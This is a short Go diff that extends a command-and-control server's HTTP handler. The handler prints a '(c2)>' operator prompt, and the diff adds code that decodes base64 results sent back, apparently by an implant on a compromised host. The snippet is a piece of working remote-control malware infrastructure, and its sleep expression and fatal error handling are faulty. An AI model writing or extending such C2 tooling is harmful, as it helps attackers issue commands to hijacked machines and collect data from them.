@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"encoding/base64"
 	"fmt"
 	"log"
 	"net/http"
@@ -10,8 +11,16 @@ import (
 )
 
 func cmdHandler(w http.ResponseWriter, r *http.Request) {
-	fmt.Println("recieved req")
+	fmt.Println("recieved req:")
 	time.Sleep(1 / 2 * time.Second)
+	feedbackBase64 := r.URL.Query().Get("res")
+	feedback, err := base64.StdEncoding.DecodeString(feedbackBase64)
+
+	if err != nil {
+		log.Fatal("could not decode string", err)
+	}
+
+	fmt.Println("feedback varible is set to:", string(feedback))
 
 	fmt.Print("(c2)>")
 	reader := bufio.NewReader(os.Stdin)
